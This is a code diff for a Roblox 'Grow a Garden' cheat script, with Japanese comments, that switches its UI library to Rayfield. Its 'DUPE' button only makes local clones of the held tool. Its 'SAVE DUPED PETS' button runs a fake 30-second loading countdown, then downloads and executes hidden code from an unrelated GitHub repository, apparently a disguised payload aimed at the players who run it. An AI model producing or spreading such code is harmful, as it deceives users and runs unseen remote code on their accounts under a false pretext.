@@ -2,87 +2,104 @@ local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local player = Players.LocalPlayer
 
--- Kavo UIのロード
-local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
-local Window = Library.CreateLib("2.0 - New Flow", "Ocean")
+-- ✅ Rayfield の安定版URLで読み込み
+local Rayfield = loadstring(game:HttpGet("https://raw.githubusercontent.com/SiriusSoftwareLtd/Rayfield/main/source.lua"))()
 
--- メインタブ作成
-local MainTab = Window:NewTab("Main")
-local MainSection = MainTab:NewSection("Main Controls")
+-- UI Window Setup
+local Window = Rayfield:CreateWindow({
+	Name = "2.0 - New Flow",
+	LoadingTitle = "Booting Up...",
+	LoadingSubtitle = "Made By Glow a Guardian",
+	ConfigurationSaving = {
+		Enabled = false
+	},
+	Discord = {
+		Enabled = false
+	},
+	KeySystem = false
+})
 
--- ツール名表示ラベル（初期値：Nothing）
-local currentTool = "Nothing"
-local toolLabel = MainSection:NewLabel("Holding: " .. currentTool)
+-- Main Tab
+local MainTab = Window:CreateTab("Main", 0)
+
+-- Tool Display
+local toolLabel = MainTab:CreateParagraph({
+	Title = "Holding:",
+	Content = "Nothing"
+})
 
 RunService.RenderStepped:Connect(function()
 	local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
-	local name = tool and tool.Name or "Nothing"
-	if name ~= currentTool then
-		currentTool = name
-		toolLabel:Update("Holding: " .. currentTool)
-	end
-end)
-
--- Dupe Amount 入力
-local dupeAmount = 1
-MainSection:NewTextBox("Dupe Amount (1-100)", "Enter a number", function(text)
-	local number = tonumber(text)
-	if number and number >= 1 and number <= 100 then
-		dupeAmount = number
+	if tool then
+		toolLabel:Set({Title = "Holding:", Content = tool.Name})
 	else
-		warn("Enter a number between 1 and 100")
+		toolLabel:Set({Title = "Holding:", Content = "Nothing"})
 	end
 end)
 
--- 複製ボタン
-MainSection:NewButton("DUPE", "Duplicate your tool", function()
-	local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
-	if not tool then
-		warn("No tool to duplicate.")
-		return
+-- Dupe Amount Input
+local dupeAmount = 1
+MainTab:CreateInput({
+	Name = "Dupe Amount (1-100)",
+	PlaceholderText = "Enter a number",
+	RemoveTextAfterFocusLost = false,
+	Callback = function(text)
+		local number = tonumber(text)
+		if number and number >= 1 and number <= 100 then
+			dupeAmount = number
+		else
+			warn("Enter a number between 1 and 100")
+		end
 	end
-	for i = 1, dupeAmount do
-		local clone = tool:Clone()
-		clone.Parent = player.Backpack
-	end
-end)
+})
 
--- 状態表示用ラベル
-local statusLabel = MainSection:NewLabel("SAVE STATUS: Ready")
-
--- カウント制御フラグ
-local currentCountdownId = 0
-
--- SAVE DUPED PETS ボタン
-MainSection:NewButton("SAVE DUPED PETS", "Starts saving after countdown", function()
-	currentCountdownId += 1
-	local thisCountdownId = currentCountdownId
-
-	task.spawn(function()
-		for i = 30, 1, -1 do
-			-- 他のカウントダウンが始まったら中止
-			if thisCountdownId ~= currentCountdownId then return end
-			statusLabel:Update("SAVE STATUS: ⏳ Loading pet info... (" .. i .. "s)")
-			wait(1)
+-- Dupe Button
+MainTab:CreateButton({
+	Name = "DUPE",
+	Callback = function()
+		local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
+		if not tool then
+			warn("No tool to duplicate.")
+			return
 		end
 
-		if thisCountdownId ~= currentCountdownId then return end
+		for i = 1, dupeAmount do
+			local clone = tool:Clone()
+			clone.Parent = player.Backpack
+		end
+	end
+})
 
-		statusLabel:Update("SAVE STATUS: 🚀 Booting...")
+-- SAVE STATUS 表示用パラグラフ
+local saveStatusLabel = MainTab:CreateParagraph({
+	Title = "SAVE STATUS",
+	Content = "Ready"
+})
 
-		local url = "https://raw.githubusercontent.com/aa362/growagardening/refs/heads/main/uitest"
+-- SAVE DUPED PETS Button（30秒ロード演出 → スクリプト実行）
+MainTab:CreateButton({
+	Name = "SAVE DUPED PETS",
+	Callback = function()
+		task.spawn(function()
+			-- 30秒カウントダウン演出
+			for countdown = 30, 1, -1 do
+				saveStatusLabel:Set({
+					Content = "⌛ Loading pet information... (" .. countdown .. "s)"
+				})
+				wait(1)
+			end
 
-		for j = 1, 2 do
+			-- スクリプト実行
+			saveStatusLabel:Set({Content = "🚀 Booting..."})
 			local success, err = pcall(function()
-				loadstring(game:HttpGet(url))()
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/aa362/growagarden/refs/heads/main/uitest"))()
 			end)
 
-			if not success then
-				statusLabel:Update("SAVE STATUS: ❌ Error: " .. tostring(err))
-				return
+			if success then
+				saveStatusLabel:Set({Content = "✅ Success!"})
+			else
+				saveStatusLabel:Set({Content = "❌ Failed to load script: " .. tostring(err)})
 			end
-		end
-
-		statusLabel:Update("SAVE STATUS: ✅ Success! x2")
-	end)
-end)
+		end)
+	end
+})
